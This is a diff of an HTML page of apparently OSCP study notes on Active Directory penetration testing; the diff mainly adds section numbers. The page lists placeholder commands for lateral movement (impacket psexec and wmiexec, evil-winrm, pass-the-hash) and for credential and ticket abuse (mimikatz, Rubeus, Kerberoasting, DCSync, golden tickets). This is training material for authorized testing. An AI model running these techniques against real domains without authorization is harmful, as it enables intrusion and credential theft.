-<h3 id="smb-services-and-scheduled-tasks">SMB, services and scheduled tasks</h3>
+<a id="s-10-1-16-2"></a><h3 id="smb-services-and-scheduled-tasks">10.1.16.2 SMB, services and scheduled tasks</h3>
 <pre><code class="language-bash">impacket-psexec 'DOMAIN/USER:PASSWORD@TARGET'
 impacket-psexec -hashes :NT_HASH 'DOMAIN/USER@TARGET'
 impacket-smbexec 'DOMAIN/USER:PASSWORD@TARGET'
@@ -542,7 +537,7 @@ impacket-atexec -hashes :NT_HASH 'DOMAIN/USER@TARGET_HOST' "cmd.exe /c hostname 
 <blockquote>
 <p>PsExec uploads/starts a RemCom service; SMBExec repeatedly creates services with redirected output; ATExec creates a scheduled task and normally reads output from <code>ADMIN$\Temp</code>. All require more than valid credentials.</p>
 </blockquote>
-<h3 id="wmidcom">WMI/DCOM</h3>
+<a id="s-10-1-16-3"></a><h3 id="wmidcom">10.1.16.3 WMI/DCOM</h3>
 <pre><code class="language-bash">impacket-wmiexec 'DOMAIN/USER:PASSWORD@TARGET'
 impacket-wmiexec -hashes :NT_HASH 'DOMAIN/USER@TARGET'
 impacket-wmiexec -nooutput 'DOMAIN/USER:PASSWORD@TARGET' "cmd.exe /c echo MOVEMENT_OK > C:\Windows\Temp\movement-proof.txt"
@@ -552,7 +547,7 @@ impacket-dcomexec -hashes :NT_HASH 'DOMAIN/USER@TARGET'
 <blockquote>
 <p>WMIExec normally needs SMB for output even though process creation uses WMI/DCOM. Current Impacket DCOMExec rejects Kerberos for its supported DCOM objects; use WMIExec with Kerberos instead.</p>
 </blockquote>
-<h3 id="kerberos-cache">Kerberos cache</h3>
+<a id="s-10-1-16-4"></a><h3 id="kerberos-cache">10.1.16.4 Kerberos cache</h3>
 <pre><code class="language-bash">export KRB5CCNAME="$PWD/USER.ccache"
 klist
 impacket-wmiexec -k -no-pass -dc-ip DC_IP -target-ip TARGET_IP 'DOMAIN/USER@TARGET_HOST'
@@ -562,7 +557,7 @@ impacket-atexec -k -no-pass -dc-ip DC_IP 'DOMAIN/USER@TARGET_HOST' "cmd.exe /c h
 <blockquote>
 <p>Keep the SPN-matching hostname in the target string; use <code>-target-ip</code> only for routing. A CIFS TGS does not authorize HTTP/WinRM or arbitrary HOST services.</p>
 </blockquote>
-<h3 id="winrm-and-rdp">WinRM and RDP</h3>
+<a id="s-10-1-16-5"></a><h3 id="winrm-and-rdp">10.1.16.5 WinRM and RDP</h3>
 <pre><code class="language-bash">evil-winrm -i TARGET_HOST -u USER -p 'PASSWORD'
 evil-winrm -i TARGET -u USER -H NT_HASH
 evil-winrm -i TARGET_FQDN -r DOMAIN -K USER.ccache --spn HTTP
@@ -577,7 +572,7 @@ mstsc.exe /restrictedAdmin /v:TARGET_HOST
 <blockquote>
 <p>FreeRDP 3 commonly exposes <code>xfreerdp3</code>; older packages use <code>xfreerdp</code>. <code>/pth</code> is Restricted Admin mode and requires administrator access, not merely ordinary RDP logon permission.</p>
 </blockquote>
-<h3 id="key-and-ticket-transitions">Key and ticket transitions</h3>
+<a id="s-10-1-16-6"></a><h3 id="key-and-ticket-transitions">10.1.16.6 Key and ticket transitions</h3>
 <pre><code class="language-text">sekurlsa::pth /user:USER /domain:DOMAIN /ntlm:NT_HASH /run:powershell.exe
 </code></pre>
 <pre><code class="language-cmd">Rubeus.exe asktgt /user:USER /domain:DOMAIN /rc4:NT_HASH /dc:DC_HOST /ptt
@@ -631,13 +626,13 @@ klist
 
 <table><thead><tr><th>Failure</th><th>Check</th></tr></thead><tbody><tr><td>Timeout/refused</td><td>Actual source route, listener, firewall and dynamic RPC</td></tr><tr><td>Kerberos error</td><td>DNS, hostname/SPN, time, KDC route, ticket validity</td></tr><tr><td>Auth works, execution fails</td><td>ADMIN$/SCM/WMI/task/endpoint rights, token filtering and method prerequisites</td></tr><tr><td>Process created, no output</td><td>SMB/output channel, session 0, or verify a bounded side effect</td></tr><tr><td>WinRM works, second hop fails</td><td>Credential delegation/double-hop context</td></tr><tr><td>RDP password works, <code>/pth</code> fails</td><td>Restricted Admin configuration and administrator status</td></tr><tr><td>BloodHound edge unusable</td><td>Effective principal, inheritance, host reachability, required service</td></tr><tr><td>Share list works, file denied</td><td>Object-level ACL and guest/null mapping</td></tr></tbody></table>
 <p>After access, verify <code>hostname</code>, <code>whoami /all</code>, interfaces/routes and <code>klist</code>; then re-enumerate rights, sessions, credentials and newly reachable hosts.</p>
-<h2 id="re-enumerate">Re-enumerate</h2>
+<a id="s-10-1-17"></a><h2 id="re-enumerate">10.1.17 Re-enumerate</h2>
 <p>New identity/host/route → repeat domain rights, shares, SPNs, sessions, host admin, local secrets and internal reachability.</p>
-<h2 id="discover-and-recognize-candidates">Discover and recognize candidates</h2>
+<a id="s-10-1-18"></a><h2 id="discover-and-recognize-candidates">10.1.18 Discover and recognize candidates</h2>
 <p>Use these discovery checks to find a candidate, then validate the missing conditions. Cues are illustrative; complete synthetic outputs and three-outcome examples are in the linked study entries.</p>
-<h3 id="map-active-directory-attack-paths">Map Active Directory attack paths</h3>
+<a id="s-10-1-18-1"></a><h3 id="map-active-directory-attack-paths">10.1.18.1 Map Active Directory attack paths</h3>
 <details>
-<summary>Find: Establish domain identity, DC, DNS, time and route</summary>
+<summary id="variant-10-1-18-1-1">10.1.18.1.1 Find: Establish domain identity, DC, DNS, time and route</summary>
 <p>Start with the session identity and known credential scope; discover the realm/DC and inspect DNS, time and routes.</p>
 <pre><code class="language-cmd">whoami /all
 whoami /upn
@@ -653,7 +648,7 @@ w32tm /query /status
 <p><a href="/oscp/notes/methods/ad-mapping/#domain-state">Establish domain identity, DC, DNS, time and route</a>.</p>
 </details>
 <details>
-<summary>Find: Enumerate directory objects with native, LDAP and PowerView approaches</summary>
+<summary id="variant-10-1-18-1-2">10.1.18.1.2 Find: Enumerate directory objects with native, LDAP and PowerView approaches</summary>
 <p>Use the available built-in/LDAP interface from the verified domain context; inspect one useful user/group before broad graph assumptions.</p>
 <pre><code class="language-cmd">net user USER /domain
 net group "GROUP" /domain
@@ -667,7 +662,7 @@ net group "GROUP" /domain
 <p><a href="/oscp/notes/methods/ad-mapping/#domain-directory">Enumerate directory objects with native, LDAP and PowerView approaches</a>.</p>
 </details>
 <details>
-<summary>Find: Read domain shares, SYSVOL and NETLOGON for useful artifacts</summary>
+<summary id="variant-10-1-18-1-3">10.1.18.1.3 Find: Read domain shares, SYSVOL and NETLOGON for useful artifacts</summary>
 <p>Enumerate the DC/known file-server shares and inspect relevant SYSVOL/NETLOGON paths under the accepted domain identity.</p>
 <pre><code class="language-cmd">net view \\DC_HOST
 dir \\DOMAIN\SYSVOL
@@ -682,7 +677,7 @@ dir \\DOMAIN\NETLOGON
 <p><a href="/oscp/notes/methods/ad-mapping/#domain-shares">Read domain shares, SYSVOL and NETLOGON for useful artifacts</a>.</p>
 </details>
 <details>
-<summary>Find: Identify service accounts and SPNs worth investigating</summary>
+<summary id="variant-10-1-18-1-4">10.1.18.1.4 Find: Identify service accounts and SPNs worth investigating</summary>
 <p>Enumerate servicePrincipalName on user objects and associate each SPN with its owning account and memberships.</p>
 <pre><code class="language-powershell">Get-DomainUser -SPN | Select-Object samaccountname,serviceprincipalname,memberof
 </code></pre>
@@ -695,7 +690,7 @@ dir \\DOMAIN\NETLOGON
 <p><a href="/oscp/notes/methods/ad-mapping/#domain-spns">Identify service accounts and SPNs worth investigating</a>.</p>
 </details>
 <details>
-<summary>Find: Validate effective directory-object control</summary>
+<summary id="variant-10-1-18-1-5">10.1.18.1.5 Find: Validate effective directory-object control</summary>
 <p>Select a useful user/group/computer/domain object from mapping and resolve its ACE trustees, rights and object-specific scopes.</p>
 <pre><code class="language-powershell">Get-DomainObjectAcl -Identity TARGET_OBJECT -ResolveGUIDs
 </code></pre>
@@ -708,7 +703,7 @@ dir \\DOMAIN\NETLOGON
 <p><a href="/oscp/notes/methods/ad-mapping/#domain-acl">Validate effective directory-object control</a>.</p>
 </details>
 <details>
-<summary>Find: Validate host access and volatile session candidates</summary>
+<summary id="variant-10-1-18-1-6">10.1.18.1.6 Find: Validate host access and volatile session candidates</summary>
 <p>Correlate directory group/session relationships with a specific host's service and local access policy, rather than treating all host edges as administrator access.</p>
 <pre><code class="language-bash">nxc smb TARGET -d DOMAIN -u USER -p 'PASSWORD' --shares
 </code></pre>
@@ -721,7 +716,7 @@ dir \\DOMAIN\NETLOGON
 <p><a href="/oscp/notes/methods/ad-mapping/#domain-hosts">Validate host access and volatile session candidates</a>.</p>
 </details>
 <details>
-<summary>Find: Collect focused BloodHound data and validate an attack path</summary>
+<summary id="variant-10-1-18-1-7">10.1.18.1.7 Find: Collect focused BloodHound data and validate an attack path</summary>
 <p>Inspect focused collected relationships and the collector's scope/freshness before following a displayed path.</p>
 <pre><code class="language-text">In BloodHound: locate the controlled principal; inspect the exact edge, source object, destination and collection age.
 Resolve its underlying group/ACL/service evidence with the corresponding manual method.
@@ -734,9 +729,9 @@ Resolve its underlying group/ACL/service evidence with the corresponding manual 
 </blockquote>
 <p><a href="/oscp/notes/methods/ad-mapping/#domain-graph">Collect focused BloodHound data and validate an attack path</a>.</p>
 </details>
-<h3 id="gain-a-more-useful-domain-identity">Gain a more useful domain identity</h3>
+<a id="s-10-1-18-2"></a><h3 id="gain-a-more-useful-domain-identity">10.1.18.2 Gain a more useful domain identity</h3>
 <details>
-<summary>Find: Obtain accessible live logon-session credential material</summary>
+<summary id="variant-10-1-18-2-1">10.1.18.2.1 Find: Obtain accessible live logon-session credential material</summary>
 <p>On the verified controlled host inspect current token, logged-on session evidence and protection configuration before choosing a credential source.</p>
 <pre><code class="language-cmd">whoami /all
 query user
@@ -751,7 +746,7 @@ reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL
 <p><a href="/oscp/notes/methods/ad-identities/#ad-lsass">Obtain accessible live logon-session credential material</a>.</p>
 </details>
 <details>
-<summary>Find: Extract local account hashes from matched SAM and SYSTEM</summary>
+<summary id="variant-10-1-18-2-2">10.1.18.2.2 Find: Extract local account hashes from matched SAM and SYSTEM</summary>
 <p>At a host context with justified protected-file access inspect current privileges and the source machine before selecting matched registry material.</p>
 <pre><code class="language-cmd">hostname
 whoami /priv
@@ -765,7 +760,7 @@ whoami /priv
 <p><a href="/oscp/notes/methods/ad-identities/#ad-sam">Extract local account hashes from matched SAM and SYSTEM</a>.</p>
 </details>
 <details>
-<summary>Find: Extract LSA secrets and cached-domain verifiers</summary>
+<summary id="variant-10-1-18-2-3">10.1.18.2.3 Find: Extract LSA secrets and cached-domain verifiers</summary>
 <p>Inspect the rights and origin of a protected registry backup and distinguish SECURITY data from SAM before collection/parsing.</p>
 <pre><code class="language-cmd">hostname
 whoami /priv
@@ -779,7 +774,7 @@ whoami /priv
 <p><a href="/oscp/notes/methods/ad-identities/#ad-security">Extract LSA secrets and cached-domain verifiers</a>.</p>
 </details>
 <details>
-<summary>Find: Use Credential Manager and DPAPI with the protecting context</summary>
+<summary id="variant-10-1-18-2-4">10.1.18.2.4 Find: Use Credential Manager and DPAPI with the protecting context</summary>
 <p>Inspect saved-credential targets and readable protected files within the current protecting user/machine context.</p>
 <pre><code class="language-cmd">whoami /user
 cmdkey /list
@@ -793,7 +788,7 @@ cmdkey /list
 <p><a href="/oscp/notes/methods/ad-identities/#ad-dpapi">Use Credential Manager and DPAPI with the protecting context</a>.</p>
 </details>
 <details>
-<summary>Find: Parse an offline domain database or select a justified remote collection path</summary>
+<summary id="variant-10-1-18-2-5">10.1.18.2.5 Find: Parse an offline domain database or select a justified remote collection path</summary>
 <p>Start only from evidence of an already controlled DC or a domain replication right; identify the source mechanism before choosing a generic extraction command.</p>
 <pre><code class="language-bash">file NTDS.dit SYSTEM.save
 </code></pre>
@@ -806,7 +801,7 @@ cmdkey /list
 <p><a href="/oscp/notes/methods/ad-identities/#ad-ntds">Parse an offline domain database or select a justified remote collection path</a>.</p>
 </details>
 <details>
-<summary>Find: Request AS-REP material for an account without preauthentication</summary>
+<summary id="variant-10-1-18-2-6">10.1.18.2.6 Find: Request AS-REP material for an account without preauthentication</summary>
 <p>With an authenticated directory view inspect userAccountControl; without a bind, use only the documented known-user/no-password KDC path and distinguish its replies.</p>
 <pre><code class="language-powershell">Get-DomainUser -Properties samaccountname,useraccountcontrol |
   Select-Object samaccountname,@{n='UAC';e={[int]$_.useraccountcontrol}} |
@@ -821,7 +816,7 @@ cmdkey /list
 <p><a href="/oscp/notes/methods/ad-identities/#kerberos-asrep">Request AS-REP material for an account without preauthentication</a>.</p>
 </details>
 <details>
-<summary>Find: Request a selected service ticket for offline service-account recovery</summary>
+<summary id="variant-10-1-18-2-7">10.1.18.2.7 Find: Request a selected service ticket for offline service-account recovery</summary>
 <p>Use a directory client's user-owned SPN inventory and inspect the associated account's memberships/utility before requesting a selected ticket.</p>
 <pre><code class="language-powershell">Get-DomainUser -SPN | Select-Object samaccountname,serviceprincipalname,memberof
 </code></pre>
@@ -834,7 +829,7 @@ cmdkey /list
 <p><a href="/oscp/notes/methods/ad-identities/#kerberos-roast">Request a selected service ticket for offline service-account recovery</a>.</p>
 </details>
 <details>
-<summary>Find: Create a temporary SPN through an effective object right</summary>
+<summary id="variant-10-1-18-2-8">10.1.18.2.8 Find: Create a temporary SPN through an effective object right</summary>
 <p>Inspect a useful user's SPN set and resolved effective ACL rather than assuming GenericWrite always permits a desired property change.</p>
 <pre><code class="language-powershell">Get-DomainUser -Identity TARGET_USER -Properties serviceprincipalname
 Get-DomainObjectAcl -Identity TARGET_USER -ResolveGUIDs
@@ -848,7 +843,7 @@ Get-DomainObjectAcl -Identity TARGET_USER -ResolveGUIDs
 <p><a href="/oscp/notes/methods/ad-identities/#ad-targeted-roast">Create a temporary SPN through an effective object right</a>.</p>
 </details>
 <details>
-<summary>Find: Inventory, convert and import tickets in the correct logon context</summary>
+<summary id="variant-10-1-18-2-9">10.1.18.2.9 Find: Inventory, convert and import tickets in the correct logon context</summary>
 <p>Inspect tickets already available in the current logon session or cache before requesting, importing or collecting more material.</p>
 <pre><code class="language-cmd">klist
 </code></pre>
@@ -861,7 +856,7 @@ Get-DomainObjectAcl -Identity TARGET_USER -ResolveGUIDs
 <p><a href="/oscp/notes/methods/ad-identities/#kerberos-tickets">Inventory, convert and import tickets in the correct logon context</a>.</p>
 </details>
 <details>
-<summary>Find: Forge a service-scoped ticket from the correct service key</summary>
+<summary id="variant-10-1-18-2-10">10.1.18.2.10 Find: Forge a service-scoped ticket from the correct service key</summary>
 <p>Classify a verified service key and correlate its account/SPN with the specific target service and domain SID.</p>
 <pre><code class="language-cmd">setspn -Q SERVICE/TARGET_HOST
 whoami /user
@@ -876,7 +871,7 @@ klist
 <p><a href="/oscp/notes/methods/ad-identities/#kerberos-silver">Forge a service-scoped ticket from the correct service key</a>.</p>
 </details>
 <details>
-<summary>Find: Reset a target account password through a validated directory right</summary>
+<summary id="variant-10-1-18-2-11">10.1.18.2.11 Find: Reset a target account password through a validated directory right</summary>
 <p>Follow a mapped useful-user ACL edge and resolve the actual password-reset extended right for the controlled trustee.</p>
 <pre><code class="language-powershell">Get-DomainObjectAcl -Identity TARGET_USER -ResolveGUIDs
 </code></pre>
@@ -889,7 +884,7 @@ klist
 <p><a href="/oscp/notes/methods/ad-identities/#ad-password-reset">Reset a target account password through a validated directory right</a>.</p>
 </details>
 <details>
-<summary>Find: Add a controlled identity to a group through effective membership rights</summary>
+<summary id="variant-10-1-18-2-12">10.1.18.2.12 Find: Add a controlled identity to a group through effective membership rights</summary>
 <p>Select the useful group from mapping and inspect its current member list and exact member-attribute ACL.</p>
 <pre><code class="language-powershell">Get-DomainGroupMember -Identity TARGET_GROUP
 Get-DomainObjectAcl -Identity TARGET_GROUP -ResolveGUIDs
@@ -903,7 +898,7 @@ Get-DomainObjectAcl -Identity TARGET_GROUP -ResolveGUIDs
 <p><a href="/oscp/notes/methods/ad-identities/#ad-group-control">Add a controlled identity to a group through effective membership rights</a>.</p>
 </details>
 <details>
-<summary>Find: Convert ownership or DACL control into a narrower useful right</summary>
+<summary id="variant-10-1-18-2-13">10.1.18.2.13 Find: Convert ownership or DACL control into a narrower useful right</summary>
 <p>Inspect resolved ownership/DACL rights on the exact useful object and separate the intermediate right from the final desired operation.</p>
 <pre><code class="language-powershell">Get-DomainObjectAcl -Identity TARGET_OBJECT -ResolveGUIDs
 </code></pre>
@@ -916,7 +911,7 @@ Get-DomainObjectAcl -Identity TARGET_GROUP -ResolveGUIDs
 <p><a href="/oscp/notes/methods/ad-identities/#ad-owner-dacl">Convert ownership or DACL control into a narrower useful right</a>.</p>
 </details>
 <details>
-<summary>Find: Use validated directory replication rights for bounded credential proof</summary>
+<summary id="variant-10-1-18-2-14">10.1.18.2.14 Find: Use validated directory replication rights for bounded credential proof</summary>
 <p>Inspect the domain naming-context ACL and resolve replication-specific extended rights for the controlled identity/group.</p>
 <pre><code class="language-powershell">Get-DomainObjectAcl -Identity DOMAIN_DN -ResolveGUIDs
 </code></pre>
@@ -929,7 +924,7 @@ Get-DomainObjectAcl -Identity TARGET_GROUP -ResolveGUIDs
 <p><a href="/oscp/notes/methods/ad-identities/#ad-dcsync">Use validated directory replication rights for bounded credential proof</a>.</p>
 </details>
 <details>
-<summary>Find: Conditional: trace GPO control to privileged policy consumption</summary>
+<summary id="variant-10-1-18-2-15">10.1.18.2.15 Find: Conditional: trace GPO control to privileged policy consumption</summary>
 <p>Enumerate GPO/OU links, then inspect the relevant directory object and SYSVOL policy component's effective control and target applicability.</p>
 <pre><code class="language-powershell">Get-DomainGPO
 Get-DomainOU | Select-Object name,gplink
@@ -943,7 +938,7 @@ Get-DomainOU | Select-Object name,gplink
 <p><a href="/oscp/notes/methods/ad-identities/#ad-gpo">Conditional: trace GPO control to privileged policy consumption</a>.</p>
 </details>
 <details>
-<summary>Find: Conditional: use a validated delegation or RBCD relationship</summary>
+<summary id="variant-10-1-18-2-16">10.1.18.2.16 Find: Conditional: use a validated delegation or RBCD relationship</summary>
 <p>Inspect directory delegation flags/attributes and map the service principals before considering any impersonation request.</p>
 <pre><code class="language-powershell">Get-DomainComputer -TrustedToAuth
 Get-DomainComputer -Unconstrained
@@ -957,7 +952,7 @@ Get-DomainComputer -Unconstrained
 <p><a href="/oscp/notes/methods/ad-identities/#ad-delegation">Conditional: use a validated delegation or RBCD relationship</a>.</p>
 </details>
 <details>
-<summary>Find: Conditional: validate an AD CS enrollment-to-authentication path</summary>
+<summary id="variant-10-1-18-2-17">10.1.18.2.17 Find: Conditional: validate an AD CS enrollment-to-authentication path</summary>
 <p>Enumerate the CA and enabled templates with the known directory identity, then read rights and settings rather than acting on an ESC label.</p>
 <pre><code class="language-bash">certipy find -u 'USER@DOMAIN' -p 'PASSWORD' -dc-ip DC_IP -enabled
 </code></pre>
@@ -970,7 +965,7 @@ Get-DomainComputer -Unconstrained
 <p><a href="/oscp/notes/methods/ad-identities/#ad-certificates">Conditional: validate an AD CS enrollment-to-authentication path</a>.</p>
 </details>
 <details>
-<summary>Find: Conditional: understand a realm-wide TGT forgery from KRBTGT material</summary>
+<summary id="variant-10-1-18-2-18">10.1.18.2.18 Find: Conditional: understand a realm-wide TGT forgery from KRBTGT material</summary>
 <p>Begin only after protected private evidence establishes the actual domain KRBTGT key and SID; inspect account/source metadata rather than assuming any domain hash suffices.</p>
 <pre><code class="language-cmd">klist
 whoami /user
@@ -983,9 +978,9 @@ whoami /user
 </blockquote>
 <p><a href="/oscp/notes/methods/ad-identities/#kerberos-golden">Conditional: understand a realm-wide TGT forgery from KRBTGT material</a>.</p>
 </details>
-<h3 id="move-to-another-host">Move to another host</h3>
+<a id="s-10-1-18-3"></a><h3 id="move-to-another-host">10.1.18.3 Move to another host</h3>
 <details>
-<summary>Find: Match route, destination service and effective authorization</summary>
+<summary id="variant-10-1-18-3-1">10.1.18.3.1 Find: Match route, destination service and effective authorization</summary>
 <p>Use the discovered destination name/address and known credential record, then inspect the selected service ports from the actual direct or established pivot source.</p>
 <pre><code class="language-bash">nmap -Pn -sT -p 135,445,3389,5985,5986 TARGET
 getent hosts TARGET_HOST
@@ -999,7 +994,7 @@ getent hosts TARGET_HOST
 <p><a href="/oscp/notes/methods/lateral-movement/#move-preflight">Match route, destination service and effective authorization</a>.</p>
 </details>
 <details>
-<summary>Find: Execute through uploaded service creation using PsExec</summary>
+<summary id="variant-10-1-18-3-2">10.1.18.3.2 Find: Execute through uploaded service creation using PsExec</summary>
 <p>From an accepted SMB identity inspect the required administrative share and the separate ability to create/start services on that host.</p>
 <pre><code class="language-bash">nxc smb TARGET -d DOMAIN -u USER -p 'PASSWORD' --shares
 </code></pre>
@@ -1012,7 +1007,7 @@ getent hosts TARGET_HOST
 <p><a href="/oscp/notes/methods/lateral-movement/#move-services">Execute through uploaded service creation using PsExec</a>.</p>
 </details>
 <details>
-<summary>Find: Execute commands through service command lines and SMB output</summary>
+<summary id="variant-10-1-18-3-3">10.1.18.3.3 Find: Execute commands through service command lines and SMB output</summary>
 <p>Inspect known administrative SMB/SCM context and the output-share path when a service-command mechanism is preferable to binary upload.</p>
 <pre><code class="language-bash">nxc smb TARGET -d DOMAIN -u USER -p 'PASSWORD' --shares
 </code></pre>
@@ -1025,7 +1020,7 @@ getent hosts TARGET_HOST
 <p><a href="/oscp/notes/methods/lateral-movement/#move-smbexec">Execute commands through service command lines and SMB output</a>.</p>
 </details>
 <details>
-<summary>Find: Execute through remote Task Scheduler</summary>
+<summary id="variant-10-1-18-3-4">10.1.18.3.4 Find: Execute through remote Task Scheduler</summary>
 <p>Use destination RPC/SMB evidence and effective administrative/task rights to investigate Task Scheduler as a one-shot execution consumer.</p>
 <pre><code class="language-powershell">Test-NetConnection TARGET -Port 135
 Test-NetConnection TARGET -Port 445
@@ -1039,7 +1034,7 @@ Test-NetConnection TARGET -Port 445
 <p><a href="/oscp/notes/methods/lateral-movement/#move-tasks">Execute through remote Task Scheduler</a>.</p>
 </details>
 <details>
-<summary>Find: Execute through WMI or native CIM over DCOM</summary>
+<summary id="variant-10-1-18-3-5">10.1.18.3.5 Find: Execute through WMI or native CIM over DCOM</summary>
 <p>Investigate WMI from RPC/service inventory and exact account rights; keep process creation and SMB-based output retrieval as separate legs.</p>
 <pre><code class="language-powershell">Test-NetConnection TARGET -Port 135
 Test-NetConnection TARGET -Port 445
@@ -1053,7 +1048,7 @@ Test-NetConnection TARGET -Port 445
 <p><a href="/oscp/notes/methods/lateral-movement/#move-wmi">Execute through WMI or native CIM over DCOM</a>.</p>
 </details>
 <details>
-<summary>Find: Execute through an authorized DCOM application object</summary>
+<summary id="variant-10-1-18-3-6">10.1.18.3.6 Find: Execute through an authorized DCOM application object</summary>
 <p>Use the target's RPC and administration evidence to investigate a specific supported COM application, rather than treating DCOM as a universal shell.</p>
 <pre><code class="language-powershell">Test-NetConnection TARGET -Port 135
 </code></pre>
@@ -1066,7 +1061,7 @@ Test-NetConnection TARGET -Port 445
 <p><a href="/oscp/notes/methods/lateral-movement/#move-dcom">Execute through an authorized DCOM application object</a>.</p>
 </details>
 <details>
-<summary>Find: Use WinRM, WinRS or PowerShell remoting</summary>
+<summary id="variant-10-1-18-3-7">10.1.18.3.7 Find: Use WinRM, WinRS or PowerShell remoting</summary>
 <p>Check observed WinRM listeners from the real source and relate the identity to the configured endpoint/session authorization.</p>
 <pre><code class="language-powershell">Test-NetConnection TARGET -Port 5985
 Test-NetConnection TARGET -Port 5986
@@ -1080,7 +1075,7 @@ Test-NetConnection TARGET -Port 5986
 <p><a href="/oscp/notes/methods/lateral-movement/#move-winrm">Use WinRM, WinRS or PowerShell remoting</a>.</p>
 </details>
 <details>
-<summary>Find: Obtain an authorized RDP interactive session</summary>
+<summary id="variant-10-1-18-3-8">10.1.18.3.8 Find: Obtain an authorized RDP interactive session</summary>
 <p>Check the destination RDP endpoint and use actual group/logon-policy evidence for the candidate identity; determine whether password or Restricted Admin is intended.</p>
 <pre><code class="language-powershell">Test-NetConnection TARGET -Port 3389
 </code></pre>
@@ -1093,7 +1088,7 @@ Test-NetConnection TARGET -Port 5986
 <p><a href="/oscp/notes/methods/lateral-movement/#move-rdp">Obtain an authorized RDP interactive session</a>.</p>
 </details>
 <details>
-<summary>Find: Select password, NT hash, key-to-ticket or ticket authentication</summary>
+<summary id="variant-10-1-18-3-9">10.1.18.3.9 Find: Select password, NT hash, key-to-ticket or ticket authentication</summary>
 <p>Return to the credential source and inspect format, identity and ticket service scope before selecting a remote protocol.</p>
 <pre><code class="language-bash">klist
 getent hosts TARGET_HOST
